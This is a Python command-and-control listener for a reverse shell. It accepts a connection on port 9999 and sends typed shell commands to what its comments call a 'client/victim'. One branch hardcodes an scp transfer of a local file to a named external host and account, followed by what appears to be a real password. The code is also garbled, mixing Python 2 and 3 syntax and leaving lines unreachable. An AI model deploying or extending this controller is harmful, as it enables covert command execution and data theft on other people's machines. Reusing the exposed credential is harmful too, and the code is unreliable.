import socket
import sys,time


# Create a Socket ( connect two computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()


# Establish connection with a client (socket must be listening)

def socket_accept():
    global xx
    xx=0
    conn, address = s.accept()
    print("Connection has been established! |" + " IP " + address[0] + " | Port" + str(address[1]))
    while True:
        send_commands(conn)
        if xx==1:
            sys.exit()
    conn.close()

# Send commands to client/victim or a friend
def send_commands(conn):
    while True:
        cmd = input()
        if cmd=='scp /root/Downloads/162858.jpg ssh aayushbhargava@wanheda.dev.evivehealth.com:/Users/aayushbhargava/Documents/':
            conn.send(str.encode(str(cmd)))
            print 'jhjjj'
            time.sleep(3)
            conn.send(str.encode(str('echo Aayush@860')))
            print 'kkjnkjn'
            p=(conn.recv(1024),"utf-8")
            client_response = str(p)
            print(client_response)
            
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
            global xx
            xx=1
        if len(str.encode(str(cmd))) > 0:
            conn.send(str.encode(str(cmd)))
            p=(conn.recv(1024),"utf-8")
            client_response = str(p)
            print(client_response)


def main():
    create_socket()
    bind_socket()
    socket_accept()


main()




#npx kill-port 9999


